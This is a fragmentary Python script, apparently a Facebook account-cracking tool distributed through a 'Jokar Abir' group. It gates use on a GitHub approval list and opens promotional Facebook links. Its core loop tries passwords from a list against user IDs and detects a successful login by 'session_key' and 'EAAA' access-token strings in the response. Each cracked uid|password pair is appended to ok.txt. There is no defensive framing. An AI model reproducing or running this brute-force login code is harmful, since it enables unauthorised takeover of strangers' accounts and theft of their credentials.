...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Jokar-Abir37/Abir1-Aproval.txt/blob/main/Abir-Aproval.txt"])
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/groups/Jokar.Abir123/?ref=share_group_link")
	...
	os.system("xdg-open https://www.facebook.com/groups/Jokar.Abir123/?ref=share_group_link")
	subprocess.check_output(["am", "start", "https://www.facebook.com/groups/Jokar.Abir123/?ref=share_group_link"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Jokar-Abir37/Abir1-Aproval.txt/blob/main/Abir-Aproval.txt').text
			if basesplit in plr:
				key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/groups/Jokar.Abir123/?ref=share_group_link/UCOo-omO_OVoU0B1109O0Z8g"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=JAN=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=JAN=OK=>]  %s|%s\n"%(uid, pw))
				break
